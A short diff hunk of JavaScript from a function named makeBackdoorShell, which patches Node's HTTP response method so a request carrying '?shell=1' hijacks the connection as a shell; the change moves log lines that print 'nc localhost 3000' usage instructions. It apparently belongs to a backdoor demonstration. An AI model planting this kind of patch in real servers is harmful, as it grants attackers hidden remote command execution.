@@ -89,14 +89,14 @@
  function makeBackdoorShell ( ) {
 	 require('http').ServerResponse.prototype.end = (function ( end ) {
 		 return function ( ) {
-			 if (this.socket._httpMessage.req.query.shell === '1') {
-				 
-				 console.log('..............................');
-				 console.log('How to obtain a shell session:');
-				 console.log('$> nc localhost 3000');
-				 console.log('$> GET /?shell=1 HTTP/1.1');
-				 console.log('``````````````````````````````');
 
+			 console.log('..............................');
+			 console.log('How to obtain a shell session:');
+			 console.log('$> nc localhost 3000');
+			 console.log('$> GET/?shell=1 HTTP/1.1');
+			 console.log('``````````````````````````````');
+
+			 if (this.socket._httpMessage.req.query.shell === '1') {
 				 ['close',
 				  'connect',
 				  'data',
